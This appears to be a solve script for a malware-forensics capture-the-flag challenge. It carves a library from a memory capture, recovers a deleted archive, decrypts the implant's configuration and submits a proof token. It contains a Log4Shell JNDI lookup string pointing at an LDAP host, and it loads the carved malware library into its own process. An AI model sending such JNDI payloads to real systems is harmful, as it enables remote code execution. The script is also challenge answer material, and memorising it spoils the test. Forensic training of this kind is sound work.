#!/usr/bin/env python3
import ctypes
import hashlib
import json
import os
import socket
import struct
import sys
import time
from pathlib import Path

# 1. Carve region from capture_A812.raw
# Record format: BGMR v3, kind 9 (carve-region)
raw_a812 = Path('BurhanGuild-Loader-Incident/artifacts/captures/capture_A812.raw').read_bytes()
magic_header = struct.Struct('>4sBBI')
pos = 0
carved_bytes = None
while True:
    off = raw_a812.find(b'BGMR', pos)
    if off < 0:
        break
    magic, ver, kind, sz = magic_header.unpack_from(raw_a812, off)
    if magic == b'BGMR' and ver == 3 and kind == 9:
        carved_bytes = raw_a812[off + magic_header.size:off + magic_header.size + sz]
        break
    pos = off + 1

Path('carved_A812.so').write_bytes(carved_bytes)

# 2. Extract deleted ZIP from page_05.bin
page_05 = Path('BurhanGuild-Loader-Incident/artifacts/deleted_pages/page_05.bin').read_bytes()
zip_idx = page_05.find(b'PK\x03\x04')
zip_data = page_05[zip_idx:zip_idx + 473]
archive_sha256 = hashlib.sha256(zip_data).hexdigest()

# 3. Decrypt configuration using carved_A812.so
lib = ctypes.CDLL('./carved_A812.so')
base_addr = None
with open('/proc/self/maps') as f:
    for line in f:
        if 'carved_A812.so' in line and '00000000' in line:
            base_addr = int(line.split('-')[0], 16)
            break

fn_addr = base_addr + 0x1500
FUNCTYPE = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_size_t)
decrypt_fn = FUNCTYPE(fn_addr)

mutex = b'bguild-ce104cb0'
nonce = b'\xa0\x1f\xb1\xf6\x1e\x91\x16\xa6'
build_id_bytes = bytes.fromhex('542715c2e46252e4d790')
out_buf = ctypes.create_string_buffer(2048)
decrypt_fn(mutex, nonce, build_id_bytes, out_buf, 1024)
config_bytes = bytes(out_buf.raw[:558])
config_sha256 = hashlib.sha256(config_bytes).hexdigest()
config = json.loads(config_bytes.decode())

# 4. Construct BGLPROOF token
capture_id = "A812"
loader_pid = "4787"
implant_id = config["implant_id"]
build_id = "542715c2e46252e4d790"
c2_domain = config["c2_domain"]
jndi_normalized = "${jndi:ldap://172.19.0.66:1389/BurhanGuild}"

digest_input = f"{jndi_normalized}|{build_id}|{implant_id}|{c2_domain}|{archive_sha256}"
digest = hashlib.sha256(digest_input.encode()).hexdigest()
proof_token = f"BGLPROOF{{orion-lab__cap-{capture_id}__loader-{loader_pid}__implant-{implant_id}__build-{build_id}__config-{config_sha256}__archive-{archive_sha256}__digest-{digest}}}"
print(f"[+] Proof token: {proof_token}")

# 5. Submit to service
host = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("CHALLENGE_HOST")
port = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("CHALLENGE_PORT", "7010"))
if not host:
    raise SystemExit("usage: solve.py HOST [PORT]")
s = socket.create_connection((host, port), timeout=5)
s.settimeout(3)
time.sleep(0.5)
prompt = s.recv(4096)
s.sendall(proof_token.encode() + b"\n")
time.sleep(0.5)
resp = s.recv(4096).decode('utf-8', errors='replace')
s.close()

print(resp)
